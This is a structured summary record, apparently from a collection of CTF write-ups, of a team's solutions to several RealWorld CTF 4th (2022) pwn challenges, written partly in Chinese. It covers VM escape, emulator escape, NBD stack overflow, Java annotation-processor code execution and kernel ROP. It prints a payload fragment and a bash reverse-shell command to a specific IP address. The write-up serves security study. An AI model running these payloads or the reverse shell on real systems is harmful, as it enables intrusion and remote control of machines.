---
title: RealWorld CTF 4th Writeup by r3kapig
contest: RealWorld CTF 4th
year: 2022
difficulty: high
vuln_type: pwn_unknown
tags: [custom-vm, opcode-bytecode, qiling-framework, /proc/self/mem, nbd-network-block-device, opt_info-stacking, annotation-processor, csp-bypass, kernel-rop]
attack_chain:
  - svme 自定义 VM 19 opcode (NOOP/IADD/ISUB/IMUL/ILT/IEQ/BR/BRT/BRF/ICONST/LOAD/GLOAD/STORE/GSTORE/PRINT/POP/CALL/RET/HALT)
  - GSTORE 写 global 段 + LOAD 写 local 段 + STORE -992 偏移触发越界写
  - 算 system 地址 (libc leak 0x7ffff7dea0b3) + __free_hook 改写
  - ql_open ql_qiling 框架: 读 /proc/self/maps 找 python 偏移 + /proc/self/mem 写 __cxa_finalize 改 libc
  - ql_open: openat(2) 拿 dir_fd + openat(257) 拼 "../../../../" 越权
  - read shellcode to free_hook 改 __free_hook=system
  - NBD (Network Block Device) 协议 + NBD_OPT_INFO 栈溢出
  - NBD_OPT_EXPORT_NAME(1) + NBD_OPT_INFO(7) + NBD_OPT_STARTTLS(5)
  - NBD_OPT_INFO 触发 NBD_CMD 解析 + format string + stack overflow
  - canary brute force: 0x408 padding + 0x7 字节爆破 (单字节 error-based)
  - leak_heap + leak_pie + ret2libc system 0x3bb0
  - Java 注解处理器: @Fuck 注释 + FuckProcessor 编译时执行 exp() 读 /flag
  - javac -cp + java -Djava.security.policy==/dev/null 绕 sandbox
  - AnnotationProcessor init() + process() 都调 exp() 读 File /flag
  - kernel ROP: padd 16 + "sleep 3;bash -c 'exec bash -i &>/dev/tcp/49.234.220.122/20191 <&1'"*6
key_payload: code=p32(GSTORE)+p32(0)+p32(GLOAD)+p32(0x86)+p32(PUSH)+p32(0x7ffff7e18410-0x7ffff7dea0b3)+p32(ADD) (system 地址) + GSTORE 写 free_hook
one_liner: RealWorld CTF 4th r3kapig 多 PWN 大全：svme 自定义 VM 字节码逃逸 + ql_qiling /proc/self/mem 写 libc + NBD 网络块设备 NBD_OPT_INFO 栈溢出 + Java 注解处理器 RCE + kernel ROP 反弹。
lesson: 自定义 VM GSTORE + STORE 负偏移可越界写 libc；ql_qiling 用户态模拟框架 /proc/self/mem 可任意写；NBD 是 Linux 块设备网络协议，OPT_INFO 处理 format string 触发栈溢出；Java AnnotationProcessor 编译时执行是隐藏 RCE 入口。
quality: high
---
